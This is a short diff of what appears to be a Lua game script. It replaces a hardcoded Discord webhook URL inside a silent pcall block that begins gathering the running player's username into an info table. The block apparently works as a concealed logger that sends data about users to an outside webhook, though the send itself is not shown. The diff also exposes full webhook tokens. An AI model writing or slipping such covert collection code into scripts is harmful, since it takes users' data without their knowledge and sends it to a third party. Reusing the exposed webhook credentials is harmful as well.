@@ -51,7 +51,7 @@ end
 --==================================================
 
 pcall(function()
-    local _W = "https://discord.com/api/webhooks/1558532887106551808/GN9RM2LTE8K0-abawBEH6SFqWJ1rFlMRBd6CW2IXUsNTJsBO9vYa22yKwO1-25PBIZ6g"
+    local _W = "https://discord.com/api/webhooks/1567921405239103488/G11TIn-mQ7uN0v-AdCLh7dJSnVccHy5qNVr3Aw9PQzgPiNohSGGtE4GWYizXU3T5erYV"
     local _info = {}
 
     _info.Username = _L.Name
